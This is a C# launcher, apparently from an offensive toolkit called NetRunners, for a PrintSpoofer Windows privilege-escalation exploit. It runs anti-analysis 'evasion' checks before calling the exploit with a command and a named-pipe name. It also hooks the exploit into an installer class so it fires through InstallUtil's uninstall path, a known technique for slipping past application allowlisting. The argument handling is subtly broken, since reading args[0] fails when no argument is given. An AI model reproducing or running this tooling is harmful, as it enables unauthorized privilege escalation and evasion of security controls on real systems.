using static NetRunners.PrintSpoofer.Printspoofer;

namespace NetRunners.PrintSpoofer
{
    public class Program
    { 
        // TO-DO - Add argumnent parsing, pipename and cmd.
        static void Main(string[] args)
        {
            string cmd = NetRunners.Helpers.Helper.SelectCmd();
            
            // evasion
            NetRunners.Helpers.Helper.PerformChecks();

            string pipeName = (args[0] != null)
                ? args[0]
                : "mypipe";     // default name

            Exploit(pipeName, cmd);
        }
    }

    /// <summary>
    /// Add InstallUtil support.
    /// </summary>
    [System.ComponentModel.RunInstaller(true)]      // add installutil support
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            string cmd = NetRunners.Helpers.Helper.SelectCmd();
            string pipeName = "mypipe";     // default name
            
            // evasion
            NetRunners.Helpers.Helper.PerformChecks();
            // execution
            Exploit(pipeName, cmd);
        }
    }
}
